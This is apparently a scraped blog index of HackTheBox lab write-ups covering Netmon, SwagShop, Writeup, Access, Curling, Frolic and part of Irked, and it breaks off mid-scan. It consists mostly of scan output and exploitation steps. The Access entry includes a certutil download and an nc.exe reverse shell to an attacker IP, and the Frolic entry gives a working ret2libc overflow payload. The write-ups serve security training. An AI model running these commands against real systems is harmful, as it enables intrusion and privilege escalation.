20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-06-15T19:11:33 |_ start_date: 2023-06-15T18:35:59 | smb2-security-mode: | 311: |_ Message signing enabled but not required |_clock-skew: mean: -29s, deviation: 0s, median: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.73 seconds Web server Foothold/User/Root After trying default creds for PRTG, I enumerated ftp Seems like we can read majority of the folders Let\u0026rsquo;s check PRTG installed folder and search for creds According to post we have to check ProgramdData\\Paessler\\PRTG Network Monitor We see a backup configuration file PRTG Configuration.old.bak Let\u0026rsquo;s download it We found our creds No success However, if we check the screenshot and the password, the backup file was created in 2018, so lets try 2019 and so on It worked, the password ends with 2019 There is a post about command injection in PRTG Open the page indicated in the screen Add new notification Scroll down and select Execute Program Add your payload to parameter I tried different variations of payload, like adding a new user, reverse shell from https://www.revshells.com/ So the solution was to use encoded reverse shell for powershell, but with conversion to UTF-16LE Save Test notification Rooted ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/netmon/images/netmon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/netmon/","summary":"Netmon Enumeration nmap └─$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.","tags":["HTB"],"title":"[HTB] Machine: Netmon"},{"categories":null,"contents":"SwagShop Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.83 seconds gobuster └─$ gobuster dir -u http://swagshop.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://swagshop.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/17 13:09:03 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 291] /index.php (Status: 200) [Size: 16593] /media (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/media/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://swagshop.htb/includes/] /lib (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/lib/] /install.php (Status: 200) [Size: 44] /app (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/app/] /js (Status: 301) [Size: 309] [--\u0026gt; http://swagshop.htb/js/] /api.php (Status: 200) [Size: 37] /shell (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/shell/] /skin (Status: 301) [Size: 311] [--\u0026gt; http://swagshop.htb/skin/] /cron.php (Status: 200) [Size: 0] /var (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/var/] /errors (Status: 301) [Size: 313] [--\u0026gt; http://swagshop.htb/errors/] /.php (Status: 403) [Size: 291] /mage (Status: 200) [Size: 1319] /server-status (Status: 403) [Size: 300] Web server Admin page No info about the version Foothold/User Searchsploit Run poc\nLogin with creds Now we can try authenicated RCEs By the way, if you need to install pip2.7 Exploit Well, it\u0026rsquo;s not working The first error was solved by commenting: br.form.new_control('text', 'login[username]', {'value': username}) Now we need to find a way to solve the another error Launch Burp Suite and check requests Okay we send 5 requests in total According to exploit it searches for ajaxBlockUrl Which is returned to third request Let\u0026rsquo;s follow redirects Modify the payload We get our rce Now send payload and get reverse shell Root Let\u0026rsquo;s check sudo rights Check GTFOBins and get root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/swagshop/images/swagshop.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/swagshop/","summary":"SwagShop Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: SwagShop"},{"categories":null,"contents":"Writeup Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds Web server Foothold/User The site was generated by CMS Made Simple Searchsploit We don\u0026rsquo;t know the version, but we can try exploits that cover majority of versions Post Python3 version of exploit iconv -t UTF-8 -f iso-8859-1 /usr/share/wordlists/rockyou.txt \u0026gt; rockyou-utf8.txt in case you want to crack using the script, but I suggest using hashcat python3 cms_exploit.py -u http://10.10.10.138/writeup -w rockyou-utf8.txt Let\u0026rsquo;s crack the hash ssh to box Root Enumerate for privesc Automated tasks Groups staff: Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may \u0026quot;override\u0026quot; the executables in /bin and /usr/bin with the same name). Compare with group \u0026quot;adm\u0026quot;, which is more related to monitoring/security. - according to wiki We can only exploit that only via relative path Let\u0026rsquo;s find a way to exploit that When I tried connecting again via ssh while pspy was on, we see run-parts is executed via relative path So let\u0026rsquo;s create a script Make it executable Setup listener Connect via ssh again And we have our root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/writeup/images/writeup.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/writeup/","summary":"Writeup Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Writeup"},{"categories":null,"contents":"Access Enumeration nmap └─$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.1.7600 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: MegaCorp | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds Web Server Foothold/User Let\u0026rsquo;s enumerate ftp Traverse directories and download everything We see Access Control archive I tried unzipping with unzip, but had no success Using 7z was more successful, since it asked for password So now we need to look for password Let\u0026rsquo;s check backup file It\u0026rsquo;s a Microsoft Access Database We can use mdbtools sudo apt install mdbtools List the tables We see auth_-_user table Let\u0026rsquo;s dump it We can try each password to unzip the Access Control archive After unzipping we get a pst file, which is Microsoft Outlook email folder I used readpst sudo apt install pst-utils It\u0026rsquo;s a plain text file Just open it with less 'Access Control.mbox' We see an email with creds We have open telnet port Let\u0026rsquo;s connect with obtained creds Root Let\u0026rsquo;s enumerate for privesc We find a interesting lnk file It runs runas with savecred options Let\u0026rsquo;s check cmdkey for saved credentials We see that we have ACCESS\\Administrator\u0026rsquo;s credentials saved Let\u0026rsquo;s use them and get our root Download nc: certutil -urlcache -f http://10.10.16.3:8000/shell.ps1 shell.ps1 And start reverse shell: runas /user:ACCESS\\Administrator /savecred \u0026quot;nc.exe 10.10.16.3 6666 -e cmd\u0026quot; Check 0xdf\u0026rsquo;s blog for other privesc paths ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/access/images/access.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/access/","summary":"Access Enumeration nmap └─$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.","tags":["HTB"],"title":"[HTB] Machine: Access"},{"categories":null,"contents":"Curling Enumeration nmap └─$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds gobuster └─$ gobuster dir -u http://10.10.10.150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.150 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/12 18:07:47 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 14264] /media (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/media/] /templates (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/templates/] /modules (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/modules/] /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.150/images/] /bin (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/bin/] /plugins (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/plugins/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/includes/] /language (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/language/] /README.txt (Status: 200) [Size: 4872] /components (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.150/components/] /cache (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/cache/] /libraries (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/libraries/] /tmp (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/tmp/] /LICENSE.txt (Status: 200) [Size: 18092] /layouts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/layouts/] /secret.txt (Status: 200) [Size: 17] /administrator (Status: 301) [Size: 320] [--\u0026gt; http://10.10.10.150/administrator/] /configuration.php (Status: 200) [Size: 0] /htaccess.txt (Status: 200) [Size: 3005] /cli (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/cli/] Progress: 220515 / 220561 (99.98%) =============================================================== 2023/06/12 18:16:06 Finished =============================================================== Web server Joomla And let\u0026rsquo;s find joomla version Foothold Let\u0026rsquo;s check secret.txt returned by gobuster Probably a password We see the possible username Try creds to enter the administrator page We can create a new php file and use it to launch a reverse shell Let\u0026rsquo;s create it in templates page And we get our rce Set up a listener an send your reverse shell payload We got our foothold User Let\u0026rsquo;s check floris home folder We see password_backup file Which looks like a bz2 archive I uploaded archive to my vm And converted it back to binary using xxd Then decompressed using bunzip2, which result in gzip file Repeat decompressing until we get password.txt Use password to ssh or su as floris Root Enumerate for privesc linpeas and pspy64 We see an automated process/job running The job inputs config file to curl via -K option: Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line. So we can try modifying input file and read our flag Or we can add floris to sudoers by overwriting original sudoers file on the machine Create sudoers file on our box and deploy http server Modify input file to download and replace sudoers file Wait for the task and then sudo su We are root Useful: You can watch the modification of file with watch command watch -n 1 cat report ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/curling/images/curling.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/curling/","summary":"Curling Enumeration nmap └─$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Curling"},{"categories":null,"contents":"Frolic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds └─$ nmap -sV -sC -p22,139,445,1880,9999 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 17:10 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 877b912a0f11b6571ecb9f77cf35e221 (RSA) | 256 b79b06ddc25e284478411e677d1eb762 (ECDSA) |_ 256 21cf166d82a430c3c69cd738bab502b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Welcome to nginx! Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h50m26s, deviation: 3h10m30s, median: -27s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-14T16:09:55 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2023-06-14T21:39:55+05:30 |_nbstat: NetBIOS name: FROLIC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.51 seconds smbmap └─$ smbmap -H 10.10.10.111 [+] Guest session IP: 10.10.10.111:445 Name: 10.10.10.111 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) └─$ smbclient -N -L //10.10.10.111 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC gobuster port 9999 └─$ gobuster dir -u http://10.10.10.111:9999 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:34:41 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/admin/] /test (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/test/] /dev (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/backup/] /loop (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/loop/] └─$ gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999/dev [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:45:50 Starting gobuster in directory enumeration mode =============================================================== /test (Status: 200) [Size: 5] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/backup/] gobuster port 1880 └─$ gobuster dir -u http://10.10.10.111:1880 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:1880 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/22 16:42:49 Starting gobuster in directory enumeration mode =============================================================== /icons (Status: 401) [Size: 12] /red (Status: 301) [Size: 173] [--\u0026gt; /red/] /vendor (Status: 301) [Size: 179] [--\u0026gt; /vendor/] /settings (Status: 401) [Size: 12] /Icons (Status: 401) [Size: 12] /nodes (Status: 401) [Size: 12] Web server on port 1880 Web server on port 9999 Playsms Foothold/User Open files from backup route Which doesn\u0026rsquo;t work on any login page, so let\u0026rsquo;s continue enumeration If we check admin path View page source and open login.js We see the creds Let\u0026rsquo;s use them We get a weird puzzle or encrypted message Googling quite a bit resulted in esoteric programming language called Ook! Ook! Interpreter Decoded as: Nothing here check /asdiSIAJJ0QWE9JAS Let\u0026rsquo;s navigate there More encoded text Let\u0026rsquo;s curl it and decode it Which looks like a zip file Let\u0026rsquo;s unzip it Looks like it\u0026rsquo;s protected with a password Use frackzip or john2zip with john: https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux Another encoded text Remove \\r\\n to be able to decode from base64 It\u0026rsquo;s a brainfuck Interpreter Result: idkwhatispass Entering the creds to every login page Worked for Playsms login page I didn\u0026rsquo;t find a version of the application There is a list of public exploits Let\u0026rsquo;s play with php/webapps/42044.txt https://www.exploit-db.com/exploits/42044 https://www.youtube.com/watch?v=KIB9sKQdEwE Create backdoor.csv Upload csv to Phonebook We got shell Root Let\u0026rsquo;s enumerate We find a binary called rop Owned by root with setuid Which implies binary exploitation using rop Let\u0026rsquo;s download it Let\u0026rsquo;s check if we can overwrite the EIP register Create pattern msf-pattern_create -l 200 Then run binary by inputing the pattern Check EIP register Find the offset using the value of EIP: msf-pattern_offset -q 'b7Ab' We see the offset is equal to 52 So let\u0026rsquo;s test it: python3 -c 'print(\u0026quot;A\u0026quot; * 52 + \u0026quot;BBBB\u0026quot;)' And input the result to binary and check the EIP Let\u0026rsquo;s also check ASLR cat /proc/sys/kernel/randomize_va_space Okay, ASLR is off Let\u0026rsquo;s find the addresses of system and exit, since we want to overwrite EIP, so that we force program to return/call the system But we also need to make a correct stack shape, so that the program finds the arguments ldd rop - to list dynamic dependencies of the rop binary readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; system@\u0026quot; - display system table information about the object file and grep system readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; exit@\u0026quot; - display system table information about the object file and grep exit strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh - get a /bin/sh strings offset in libc Now we need to calculate the addresses and craft a payload system = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0 exit = 0xb7e19000 + 0x0002e9d0 = 0xb7e479d0 /bin/sh = 0xb7e19000 + 0x15ba0b = 0xb7f74a0b Payload: \u0026ldquo;A\u0026rdquo; * 52 + SYSTEM + EXIT + SHELL The image of the stack frame after we \u0026ldquo;call\u0026rdquo; system So let\u0026rsquo;s exploit python -c 'print(\u0026quot;A\u0026quot;*52 + \u0026quot;\\xa0\\x3d\\xe5\\xb7\u0026quot; + \u0026quot;\\xd0\\x79\\xe4\\xb7\u0026quot; + \u0026quot;\\x0b\\x4a\\xf7\\xb7\u0026quot;)' Supply the payload to binary And we are root ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/frolic/images/frolic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/frolic/","summary":"Frolic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds └─$ nmap -sV -sC -p22,139,445,1880,9999 10.","tags":["HTB"],"title":"[HTB] Machine: Frolic"},{"categories":null,"contents":"Irked Enumeration nmap └─$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown └─$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:51 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA) | 2048 752e66bfb93cccf77e848a8bf0810233 (RSA) | 256 c8a3a25e349ac49b9053f750bfea253b (ECDSA) |_ 256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind 